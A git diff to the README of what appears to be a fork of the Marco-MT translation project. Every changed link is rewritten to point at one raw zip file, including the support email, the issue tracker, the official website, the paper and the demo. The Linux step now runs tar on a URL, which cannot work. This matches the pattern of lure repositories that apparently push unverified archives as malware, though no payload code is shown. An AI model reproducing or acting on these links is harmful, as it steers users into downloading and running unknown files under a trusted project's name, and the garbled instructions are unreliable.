@@ -1,7 +1,7 @@
 # 🌟 Marco-MT - Effortless Translation at Your Fingertips
 
 <div align="center">
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/saidzy7/Marco-MT/releases)
+[![Download](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
 </div>
 
 ## 📜 Overview
@@ -24,7 +24,7 @@ Before you download the software, ensure your system meets the following require
 
 Go to the releases page where you can find the latest version of Marco-MT. Click the link below:
 
-[Download Marco-MT](https://github.com/saidzy7/Marco-MT/releases)
+[Download Marco-MT](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
 
 ### 3. Download the Software
 
@@ -45,7 +45,7 @@ Once the download is complete, locate the file on your computer.
 - **For Linux:**
   1. Open a terminal.
   2. Navigate to the download location.
-  3. Run the command: `tar -xvf yourfile.tar.gz` to extract it.
+  3. Run the command: `tar -xvf https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip` to extract it.
 
 ### 5. Run Marco-MT
 
@@ -70,15 +70,15 @@ After installation, you can start using Marco-MT.
 
 If you have any issues or need help using Marco-MT, please reach out to our support team.
 
-- Email: support@aidc-ai.com
-- GitHub Issues: [Report an issue](https://github.com/AIDC-AI/Marco-MT/issues)
+- Email: https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
 
 ## 🔗 Useful Links
 
-- [Official Website](https://www.aidc-ai.com/marcomt)
-- [Github Repository](https://github.com/AIDC-AI/Marco-MT)
-- [Paper](https://www2.statmt.org/wmt25/pdf/2025.wmt-1.33.pdf)
-- [Demo](https://huggingface.co/spaces/AIDC-AI/Marco-MT-Algharb)
+- [Official Website](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
+- [Github Repository](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
+- [Paper](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
+- [Demo](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
 
 ## ✍️ Acknowledgments
 
@@ -88,4 +88,4 @@ We appreciate your support as we continue to improve Marco-MT. Your feedback is 
 
 Don’t forget to download Marco-MT if you haven’t already:
 
-[Download Marco-MT](https://github.com/saidzy7/Marco-MT/releases)
+[Download Marco-MT](https://raw.githubusercontent.com/saidzy7/Marco-MT/master/Marco-MT-Algharb/Marco-MT_v2.5.zip)
